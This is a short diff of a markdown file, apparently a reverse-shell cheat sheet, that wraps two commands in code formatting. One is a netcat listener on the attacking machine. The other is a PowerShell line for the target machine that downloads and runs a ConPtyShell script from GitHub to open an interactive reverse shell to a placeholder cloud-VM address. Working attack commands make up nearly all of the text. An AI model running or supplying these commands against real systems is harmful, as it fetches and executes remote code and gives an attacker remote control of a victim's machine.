@@ -20,8 +20,8 @@ nc ip-address-of-your-cloud-vm
 
 #### ATTACKING machine
 
-ATTACKING machine
+`stty raw -echo; (stty size; cat) | nc -lvnp 87`
 
 #### TARGET machine
 
-IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell ip-address-of-your-cloud-vm 87
+`IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell ip-address-of-your-cloud-vm 87`
